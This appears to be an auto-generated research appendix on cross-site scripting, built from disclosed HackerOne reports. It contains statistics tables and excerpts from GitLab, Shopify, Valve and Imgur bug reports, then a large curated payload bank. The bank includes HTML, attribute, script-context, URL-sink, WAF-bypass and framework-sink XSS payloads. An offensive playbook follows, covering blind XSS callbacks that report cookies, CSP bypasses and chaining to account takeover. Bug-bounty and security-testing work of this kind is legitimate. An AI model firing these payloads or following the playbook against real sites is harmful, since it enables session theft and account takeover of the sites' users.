# Evidence appendix — Cross-Site Scripting

Mined from all **2569 valid disclosed reports** for this class (546 paid, 21% — payment is not validity).

## Technique frequency (all valid writeups)

| Item | Count |
|---|---:|
| DOM / HTML source inspection | 743 |
| second-order / stored / blind delivery | 413 |
| encoding / double-encode / null byte | 332 |
| WAF / sanitizer / filter bypass | 332 |
| admin / privileged-role context | 267 |
| public source-code / repo review | 208 |
| file upload / filename / extension | 207 |
| HTTP method / verb tampering | 183 |
| two-account / cross-account replay | 158 |
| Content-Type / body-format switch | 135 |
| internal service / port / container | 120 |
| XML / SOAP / SAML / XXE | 113 |
| header injection (Host / X-Forwarded / etc.) | 104 |
| cache / CDN / unkeyed header | 86 |
| webhook / OAuth / SAML / integration abuse | 79 |
| subdomain / DNS / cert-transparency recon | 70 |
| intercept & replay request in Burp | 62 |
| OAST / DNS / HTTP callback proof | 47 |
| redirect chain / Location header | 47 |
| parameter pollution / duplicate keys | 43 |
| JWT / token / base64 decode | 41 |
| unauthenticated / removed-cookie test | 39 |
| employee / developer public info | 38 |
| error message / stack trace probing | 36 |
| JS bundle / source-map inspection | 34 |
| API docs / Swagger / introspection | 32 |
| parser confusion / normalization | 31 |
| template injection (SSTI) | 23 |
| browser DevTools / network tab | 22 |
| git history / exposed .git | 20 |
| verbose debug / framework fingerprint | 18 |
| cloud metadata / IAM abuse | 17 |
| deserialization / gadget chain | 14 |
| race / concurrency / timing | 14 |
| fuzzing / wordlist brute force | 14 |
| mass assignment / extra request fields | 11 |
| public bucket / storage exposure | 11 |
| archive / Wayback endpoint discovery | 10 |
| third-party data / paste / breach reuse | 9 |
| search-engine dorking | 6 |
|  HosT/absolute-URL reset poisoning | 6 |
| swap object ID / parameter value | 5 |
| replay / modify a captured request | 5 |
| response diff / status / length comparison | 3 |

## Tools mentioned

| Item | Count |
|---|---:|
| browser | 320 |
| devtools | 194 |
| source-code-review | 168 |
| burp | 63 |
| curl | 36 |
| git | 36 |
| javascript-debugging | 33 |
| python | 15 |
| burp-repeater | 8 |
| beautifier | 6 |
| xss-server | 5 |
| burp-collaborator | 5 |
| collaborator/oast | 5 |
| burp-intruder | 1 |
| nmap | 1 |
| dalfox | 1 |
| interactsh | 1 |
| nuclei | 1 |
| shodan | 1 |
| zap | 1 |

## Bypass primitives

| Item | Count |
|---|---:|
| bypass | 261 |
| content-type | 203 |
| blind | 50 |
| bypassed | 44 |
| open redirect | 43 |
| whitelist | 39 |
| %0d%0a | 33 |
| bypasses | 26 |
| unicode | 22 |
| bypassing | 21 |
| content type | 14 |
| %00 | 13 |
| blacklist | 12 |
| html encoded | 12 |
| html-encoded | 11 |
| normalized | 9 |
| url encoding | 9 |
| crlf | 8 |
| allowlist | 8 |
| url encoded | 7 |
| transfer-encoding | 6 |
| html encoding | 6 |
| lowercase | 6 |
| host header | 5 |
| uppercase | 5 |
| chunked | 4 |
| normalize | 4 |
| http method | 3 |

## Impact language

| Item | Count |
|---|---:|
| admin | 902 |
| token | 395 |
| password | 213 |
| localhost | 169 |
| credential | 123 |
| account takeover | 50 |
| payment | 39 |
| sensitive information | 37 |
| secret | 34 |
| sensitive data | 23 |
| arbitrary code | 22 |
| rce | 21 |
| unauthorized | 21 |
| exfiltrate | 20 |
| exfiltration | 20 |
| remote code execution | 13 |
| funds | 10 |
| privilege escalation | 9 |
| pii | 7 |
| ato | 7 |

## Parameters observed

| Item | Count |
|---|---:|
| src | 393 |
| onerror | 319 |
| name | 157 |
| type | 117 |
| value | 99 |
| onload | 93 |
| href | 82 |
| class | 53 |
| onmouseover | 40 |
| action | 31 |
| x15 | 25 |
| method | 24 |
| style | 22 |
| url | 21 |
| mode | 19 |
| lang | 18 |
| charset | 16 |
| title | 15 |
| rel | 13 |
| content | 11 |
| target | 11 |
| onclick | 10 |
| size | 9 |
| data | 7 |
| path | 7 |
| onfocus | 7 |
| max-age | 7 |
| email | 6 |
| boundary | 6 |
| description | 6 |

## Recurring approach patterns

- **11×** juliocesar was able to demonstrate this vulnerability by crafting a specially formatted url
  - e.g. @juliocesar was able to demonstrate this vulnerability by crafting a specially formatted URL.
- **9×** description i discovered a cross site scripting xss vulnerability on specifically through the post method
  - e.g. **Description:** I discovered a Cross-Site Scripting (XSS) vulnerability on █████ , specifically through the POST method.
- **5×** and i can used this for ad jacking session hijacking bypassing csrf protection crypto mining
  - e.g. || And I can used this for 1-Ad-Jacking 2-Session Hijacking 3-Bypassing CSRF protection 4-Crypto Mining ::::)))
- **2×** i found stored xss in concrete5
  - e.g. I found stored XSS in concrete5 5.7.0.4.
- **2×** i want to report a reflected xss vulnerability that i found in www vimeo com website and which can affect the safety of your users
  - e.g. I want to report a Reflected xss vulnerability that I found in www.vimeo.com website and which can affect the safety of your users.
- **2×** proof of concept i ve created an example malicious application associated with my partner account shopify whitehat bored engineer to demonstrate the issue
  - e.g. #Proof of Concept I've created an example malicious application associated with my partner account `shopify-whitehat-1@bored.engineer` to demonstrate the issue...
- **2×** i discovered cross site scripting issue on the endpoint
  - e.g. I discovered Cross-Site scripting issue on the endpoint.
- **2×** report two weeks after the fix i ended up discovering what would soon become a head scratching mystery injecting a single in the payload would bypass the filter entirely and force the back end to somehow produce an unescaped along with the escaped one
  - e.g. ### Report #2 Two weeks after the fix, I ended up discovering what would soon become a “head-scratching” mystery: injecting a **single** `%` in the payload would bypass the filter entirely and force the back-end to somehow produce an unescaped `<` along with the escaped one.
- **2×** report two months after the last fix i discovered how the waf wouldn t account for full width and small forms variants which chained with the confusion from the second report would again trick the back end into producing a valid output indeed giving u ff1c or u fe64 as the input would pass the waf and the back end would transform both into
  - e.g. ### Report #3 Two months after the last fix, I discovered how the WAF wouldn't account for [Full-Width]( and [Small-Forms]( variants which, chained with the `%` confusion from the second report would again trick the back-end into producing a valid output: indeed, giving **`U+FF1C`** or **`U+FE64`** 
- **2×** a first fix was deployed preventing both script injections and dom events manipulation both of which i was able to bypass after a few days using a combination of control chars percentages breaks and exotic function invokation
  - e.g. A first fix was deployed preventing both script injections and DOM events manipulation, both of which I was able to bypass after a few days using a combination of **control chars, percentages, breaks, and exotic function invokation**.
- **2×** after weeks of tests in a few hours i was able to chain eight different techniques to go through the waf the back end filter and the client side javascript filter
  - e.g. After weeks of tests, in a few hours I was able to chain **_eight_ different techniques** to go through the WAF, the back-end filter, and the client-side Javascript filter: 1.
- **2×** summary i have discovered a blind stored cross site scripting vulnerability due to an insecure contact form available here this form does not properly sanitize user input allowing for the insertion and submission of dangerous characters such as angle brackets
  - e.g. ## Summary: I have discovered a blind stored cross site scripting vulnerability due to an insecure Contact form available here This form does not properly sanitize user input allowing for the insertion and submission of dangerous characters such as angle brackets.
- **2×** i was able to submit a blind xss payload through the form which was triggered in backend admin panel
  - e.g. I was able to submit a blind xss payload through the form which was triggered in backend /admin panel.
- **2×** description hello i found a reflected cross site scripting xss open akamai arl on with this security flaw is possible executing js codes
  - e.g. **Description:** Hello, I found a Reflected Cross site Scripting (XSS) Open Akamai ARL on With this security flaw is possible executing JS codes...
- **2×** in the index html erb use tag allows to embed another base64 encoded svg containing target xss payload base64 after decoding svg and use tags had to be allowed either in global configuration config action view sanitized allowed tags svg use or inline with tags argument of the helper
  - e.g. In the `index.html.erb`: `use` tag allows to embed another base64 encoded `SVG` containing target XSS payload, base64 after decoding: `SVG` and `use` tags had to be allowed either in global configuration `config.action_view.sanitized_allowed_tags = ['svg', 'use']` or inline with `tags` argument of t
- **2×** observe the popup showing document domain when right clicking right click here impact the attacker can trigger remote code execution on the victim s browser and steal credentials sessions and potentially send malware to the victim
  - e.g. Observe the popup showing document.domain when right clicking "RIGHT CLICK HERE" ███ ## Impact The attacker can trigger remote code execution on the victim’s browser, and steal credentials, sessions, and potentially send malware to the victim.
- **2×** observe the popup showing document domain when right clicking right click here suggested mitigation remediation actions
  - e.g. Observe the popup showing document.domain when right clicking "RIGHT CLICK HERE" ## Suggested Mitigation/Remediation Actions
- **2×** dod scope after analyzing i found path user nextrequestaccount action page that have militarybranch parameter in get request
  - e.g. [ DoD scope] After analyzing ` (███████) I found `path/user/NextRequestAccount.action` page that have `militarybranch` parameter in `GET` request.
- **1×** i found a xss vulnerability in relateiq com
  - e.g. I found a XSS vulnerability in relateiq.com !
- **1×** i have changed my name to ppp and i am attaching the source code view of the same no input encoding is done there
  - e.g. I have changed my name to }') ">ppp> and i am attaching the source code view of the same.No, input encoding is done there.
- **1×** i was able to edit the contents of the invite collaborators mail by using html code as my first name
  - e.g. I was able to edit the contents of the "Invite Collaborators" mail, by using HTML code as my first name.
- **1×** even when the victim manages to recover his account clicking on the edit link will give the attacker again control over the account
  - e.g. Even when the victim manages to recover his account, clicking on the "Edit" link will give the attacker again control over the account.
- **1×** i found a xss located here src x onerror alert best regards olivier beg
  - e.g. I found a XSS located here : ` src=x onerror=alert(4)>` Best regards, Olivier Beg
- **1×** hi i created a class called img src x onerror alert i hope that you know how to make a class
  - e.g. Hi, I created a class called `"><img src=x onerror=alert(4)>`, I hope that you know how to make a class..

## Case studies (full excerpts)

### 1212067 — Stored XSS in markdown via the DesignReferenceFilter
GitLab · $16000 · critical · https://hackerone.com/reports/1212067

### Summary When rendering markdown, links to designs are parsed using the following `link_reference_pattern`: The `url_filename` match is then used in `parse_symbol`: Since `valid_char` is anything apart from a forward slash or whitespace, this allows for any other special characters (such as quotes) to be matched. The final `url` match gets used when creating the link in `object_link_filter`: So if a design could be uploaded with a double quote in it's filename, this would cause it to break out of the href attribute. Normally file uploads would go through workhorse and end up being sanitized by CarrierWave::SanitizedFile, but it's possible when uploading a design to skip the workhorse by using a `Content-Disposition` header such as `Content-Disposition: form-data; name="1"; filename*=ASCII-8BIT''filename.png` which allows for any character to be used as part of the design filename. Since whitespaces and slashes are still invalid, it's only possible to inject tags without attributes, or inject attributed into the `a` element. Injecting attributes can be chained with the `ReferenceRedactor` to replace the node with arbitrary html via the `data-original` attribute: For a CSP bypass, the jsonp endpoint of the google api can be used in combination with `setTimeout`: ` ### Steps to reproduce 1. Create a new project on gitlab.com 2. Create a new issue 3. Make sure burp or similar is

### 1731349 — Stored XSS via Kroki diagram
GitLab · $13950 · high · https://hackerone.com/reports/1731349

### Summary If Kroki has been enabled, it's possible to craft a `pre` block so that arbitrary attributes can be injected into the resulting `img` tag. The css selector for finding a valid node to convert into a kroki diagram checks for either `pre[lang="#{diagram_type}"] > code` or for `pre > code[lang="#{diagram_type}"]`, but the diagram type is then set using `node.parent['lang'] || node['lang']`. So if the `code` block has a valid lang (such as `wavedrom`) then the css selector will match, but if the parent `pre` also has a `lang` attribute then it will be the one that is used and can be an arbitrary value. The `diagram_type` is then used as-is to create a url, which is used to create an image with `<img src="#{image_src}" />`. So if a double quote is used in the `diagram_type` then arbitrary attributes can be added (apart from `class` as that is replaced just below). ### Steps to reproduce 1. On a self-hosted gitlab, ensure that `Kroki` is enabled at `/admin/application_settings/general`{F2080922} 1. Create an issue and use the following payload `<a><pre lang='f/" onerror=alert(1) onload=alert(1) '><code lang="wavedrom">xss</code></pre></a>` 1. Reload/Visit the issue 1. If you do not have CSP enabled you will see the alert pop, otherwise you will see a CSP violation in the console such as `Refused to execute inline event handler because it violates the following Content Sec

### 1578400 — New /add_contacts /remove_contacts quick commands susseptible to XSS from Customer Contact firstname/lastname fields
GitLab · $13950 · high · https://hackerone.com/reports/1578400

### Summary In Gitlab 15.0.0 a new Customer Relations feature was added that allows us to use quick actions to find the contact we wish to select. However, I noticed that if I set the contact's first name or last name to <script>alert(document.domain)</script> we can get the XSS to trigger when we are attempting to use the quick commands to add/remove a contact. ### Steps to reproduce 1. Create a new group. 1. Once the group is created, navigate to the Settings -> General options for the group. 1. Expand the section "Permissions and group features" and under "Customer Relations" make sure "Enable customer relations" is selected. 1. Return back to the group page. On the left side of the screen a new menu option will appear titled "Customer relations". Select it. 1. Create a new contact with "First name" set to "`<script>alert(document.domain)</script>`" and "Last name" set to "`<script>alert(document.domain)</script>`". Provide an email address and save your changes. 1. The user you created in the previous step should now appear as a contact on the Customer Relations page. 1. Go to the create new project URL ( and under Project URL, select the Group you created earlier. Give the project a name Ex. "CustomerProject". 1. Once the project has been created on the left side of the project page select "Issues" and then click "New Issue". 1. In the description pane type "/add_contacts"

### 1444682 — XSS at jamfpro.shopifycloud.com
Shopify · $9400 · medium · https://hackerone.com/reports/1444682

*Description* There is Jamf Pro running at which has old Swagger-UI exposed at /classicapi/doc/. I think it's possible to take over the Jamf Pro account of the user that clicks the link. (more about that below) *Steps to reproduce* **POC with simple alert box**: 1. Open ` 2. You should see an alert box (F1573391) **POC rendering phishing page**: 1. Click the link: ` 2. You should see a phishing page rendered (F1573392) **POC of stealing auth token**: Jamf Pro stores authentication token in localstorage under `authToken` key when you authenticate using login and password, so my assumption is that it will do the same for Saml authentication. (you will have to test that) If it's true then taking over the user's account who clicked the link would be trivial. The POC below will print `authToken` from localstorage. 1. Authenticate to `jamfpro.shopifycloud.com` and click the link: ` 2. You should see an alert box with auth token. ## Impact An attacker can execute arbitrary JS code in the context of - it means he can do whatever authenticated user at could do. ## Impact An attacker can execute arbitrary JS code in the context of - it means he can do whatever authenticated user at could do.

### 409850 — XSS in steam react chat client
Valve · $7500 · critical · https://hackerone.com/reports/409850

The Steam chat client both sends and receives bbcode format chat messages. These map to HTML elements, and notably the [url] bbcode tag is supported for arbitrary URLs. React has strong XSS mitigations but does not mitigate `javascript:` URI based XSS. This is rather difficult to exploit as the client transmits sanitised messages and receives over a binary WebSocket. I've attached a video of executing this XSS, which is persistent. ## Impact I strongly believe an attacker could get remote code execution in Steam via this method. The Steam chat client uses the same codebase as the steam web chat client, and, I imagine does so using electron or some other webview system. These systems all expose functions which allow arbitrary calls to system to allow them to be competitive with e.g. windows forms.

### 526325 — Stored XSS in Wiki pages
GitLab · no bounty (valid finding) · high · https://hackerone.com/reports/526325

### Summary I found Stored XSS using Wiki-specific Hierarchical link Markdown in Wiki pages. ### Steps to reproduce 1. Sign in to GitLab. 2. Open a Project page that you have permission to edit Wiki pages. 3. Open Wiki page. 4. Click "New page" button. 5. Fill out "Page slug" form with `javascript:`. 6. Click "Create page" button. 7. Fill out the each form as follows: Title: `javascript:` Format: Markdown Content: `[XSS](.alert(1);)` (Please see "CreatePage.png") {F462086} 8. Click "Create page" button. 9. Click "XSS" link in created page. ### What is the current *bug* behavior? The alert dialog appears after clicking "XSS" link in created page. Please see "Result_Firefox.png". {F462087} #### Description In Detail: GitLab application converts the Markdown string `.alert(1);` to the href attribute `javascript:alert(1);`. Furthermore, Wiki-specific Markdown string `.` is converted to `javascript:` in this case. ### What is the expected *correct* behavior? The dangerous href attribute `javascript:alert(1);` should be filtered. A safe HTTP/HTTPS link should be rendered instead. ### Additional Informations: 1. In the above case, another Wiki-specific Markdown string `..` is also converted to `javascript:`. 2. Using Title string such as `javascript:STRING_EXPECTED_REMOVING` also reproduces this vulnerability. For example, if a wiki page is created with a disguised Title string `JavaS

### 484434 — Stored XSS on imgur profile
Imgur · no bounty (valid finding) · medium · https://hackerone.com/reports/484434

Hello, I submitted a report on imgur, but the staff marked it as duplicate. #482841 I reviewed the report of the first submitted report. #381553 We are on the same situation and his case is already fixed because I tried visiting his site too which is and even redoing his steps to reproduce but no XSS is triggered. And I have a different bypass and my bypass succeed. I can still fire up XSS on the said webpage. Sorry for double posting, but I think his case #381553 is already fixed and mine is different. There are still bypasses exists in the imgur create album that can cause an Stored XSS. Try to visit my site: and XSS will trigger. F410962: In my case, I bypassed the filtering using HTML entities for the alternation of <>, because I noticed that it's filtering the <>. ##Payload: **”/>&_lt;_script>alert(1)&_lt;/scr_ipt&gt”/>** remove the underscores. And I can still fire up XSS and anyone who visits the link, the XSS will trigger. I acknowledge that there was another report, for the same issue but that I still have a way to bypass whatever fix they implemented. ## Impact XSS can use to steal cookies, password or to run arbitrary code on victim's browser

## Full curated payload bank

### HTML injection — body

```text
<script>alert(document.domain)</script>
<script>alert(1)</script>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
<svg/onload=alert(1)>
<body onload=alert(1)>
<iframe srcdoc="<script>alert(parent.document.domain)</script>">
<details open ontoggle=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<input autofocus onfocus=alert(1)>
<marquee onstart=alert(1)>
<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
<form><button formaction=javascript:alert(1)>X</button>
<object data="javascript:alert(1)">
<embed src="javascript:alert(1)">
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<svg><set attributeName=onmouseover to=alert(1)>
<svg><script>alert(1)</script></svg>
<xss autofocus tabindex=1 onfocusin=alert(1)>
```

### Attribute breakout

```text
"><img src=x onerror=alert(1)>
'><img src=x onerror=alert(1)>
" autofocus onfocus=alert(1) x="
' autofocus onfocus='alert(1)' x='
" onmouseover="alert(1)
' onmouseover='alert(1)
"><svg onload=alert(1)>
"><script>alert(1)</script>
"><iframe src=javascript:alert(1)>
` onmouseover=alert(1) `
</title><script>alert(1)</script>
</textarea><script>alert(1)</script>
</style><script>alert(1)</script>
</xmp><script>alert(1)</script>
```

### JavaScript string / script context

```text
';alert(1)//
\';alert(1)//
";alert(1)//
</script><script>alert(1)</script>
</script><svg onload=alert(1)>
'-alert(1)-'
'-alert(1)//
${alert(1)}
#{alert(1)}
\u003cscript\u003ealert(1)\u003c/script\u003e
\x3cscript\x3ealert(1)\x3c/script\x3e
\u0000<script>alert(1)</script>
```

### URL, CSS & markup sinks

```text
javascript:alert(1)
javascript://%0aalert(1)
javas&#99;ript:alert(1)
java	script:alert(1)
java
script:alert(1)
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
vbscript:msgbox(1)
<a href="javascript:alert(1)">x</a>
<a href="data:text/html,<script>alert(1)</script>">x</a>
<base href="javascript:/a/-alert(1)//">
<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
<link rel=stylesheet href=javascript:alert(1)>
<div style="background:url(javascript:alert(1))">
<style>@import 'javascript:alert(1)';</style>
```

### Filter & WAF bypass

```text
<scr<script>ipt>alert(1)</scr</script>ipt>
<ScRiPt>alert(1)</sCrIpT>
<<script>script>alert(1)<</script>/script>
<img/src=x/onerror=alert(1)>
<img src=x onerror=alert(1)////>
<svg%0aonload=alert(1)>
%3Cscript%3Ealert(1)%3C/script%3E
%253Cscript%253Ealert(1)%253C/script%253E
&lt;script&gt;alert(1)&lt;/script&gt;
<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;(1)">
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
<svg onload=confirm`1`>
<svg onload=alert(1) >
<img src=x onerror=alert(1) >
<img src=x onerror=alert(1)<!-->
<img src=x onerror=alert(1)<!--->
<a href="&#x6a;avascript:alert(1)">x</a>
<img src=x onerror=&#x61;lert(1)>
```

### DOM & framework sinks

```text
#<img src=x onerror=alert(1)>
#javascript:alert(document.domain)
?next=javascript:alert(1)
{"html":"<img src=x onerror=alert(1)>"}
{"type":"message","data":"<img src=x onerror=alert(1)>"}
{{constructor.constructor('alert(1)')()}}
{{$eval.constructor('alert(1)')()}}
{{_openBlock.constructor('alert(1)')()}}
<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
```

## Field playbook (unedited)

### quick

- Reflect a unique canary in every param, path segment, header (Referer, UA, X-Forwarded-*), cookie, and JSON field; look for unencoded reflection in text/html.
- Test URL sinks separately: href/src, iframe srcdoc, formaction, xlink:href, meta refresh, and CSS url().
- Stored vectors: profile name/company, filenames, support tickets, webhook URLs, calendar invites, email subjects, admin notes.
- DOM: trace location.hash/search, postMessage, document.referrer, and localStorage into innerHTML, eval, setTimeout, jQuery .html(), or framework sinks.
- Blind XSS: inject into admin-visible fields and log viewers with a callback that reports cookies, DOM, and URL.
- Check markdown/rich-text pipelines: HTML is often sanitized before markdown is rendered, or vice versa.

### payloads

- HTML body -> `<svg onload=alert(document.domain)>` `<img src=x onerror=alert(1)>`
- Attribute -> `" autofocus onfocus=alert(1) x="` `' onmouseover='alert(1)`
- JS string -> `';alert(1)//` `\';alert(1)//` `</script><script>alert(1)</script>`
- URL sink -> `javascript:alert(1)` `data:text/html,<script>alert(1)</script>` `vbscript:msgbox(1)`
- Markdown -> `[x](javascript:alert(1))` `![x](x" onerror="alert(1))`
- Angular -> `{{constructor.constructor('alert(1)')()}}`
- mXSS -> `<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>`

### bypass

- Encode < as &lt;, %3C, \u003c, or fullwidth ＜; double-encode when the server decodes twice.
- Sanitizer gaps: data-* attributes, xlink:href, mXSS, DOMPurify version CVEs, sanitize-then-decode order.
- CSP bypass: JSONP endpoints, base-uri, dangling markup, whitelisted CDN, Angular/Vue gadgets.
- Filter bypass: `<scr<script>ipt>`, mixed case, null bytes, `<!-->`, HTML comments inside tags.
- Browser parsing quirks: `<svg><p><style><img src=x onerror=...>`, nested forms, namespace confusion.

### surface

- q
- s
- search
- query
- lang
- next
- return
- url
- redirect
- callback
- name
- title
- bio
- message
- comment
- filename
- theme
- template

### tools

- dalfox
- kxss
- XSStrike
- Burp DOM Invader
- waybackurls | gf xss | httpx
- interactsh

### chain

- Cookie/token theft -> account takeover.
- XSS in admin context -> CSRF bypass -> privileged action.
- XSS + service worker -> persistent compromise.

## Corpus search commands

```sh
python3 ~/.local/share/hackerone-reports/h1.py stats --class xss
python3 ~/.local/share/hackerone-reports/h1.py search "<feature or param>" --class xss --limit 10
python3 ~/.local/share/hackerone-reports/h1.py show <id> --full
```
